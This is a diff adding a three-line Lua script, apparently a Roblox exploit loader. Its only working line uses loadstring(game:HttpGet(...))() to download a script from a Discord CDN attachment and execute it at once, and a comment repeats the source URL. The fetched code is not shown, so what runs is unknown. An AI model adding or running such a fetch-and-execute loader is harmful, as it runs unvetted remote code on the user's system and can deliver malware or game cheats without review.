@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://cdn.discordapp.com/attachments/1155490496806912000/1258824081248227368/session_1.lua?ex=668972c8&is=66882148&hm=6e878961c5bdfba64d9b4bb8fc6f50dca2e9206e79d9b161bb3ef13514104dc5&"))()
+
+-- source https://cdn.discordapp.com/attachments/1155490496806912000/1258824081248227368/session_1.lua?ex=668972c8&is=66882148&hm=6e878961c5bdfba64d9b4bb8fc6f50dca2e9206e79d9b161bb3ef13514104dc5&
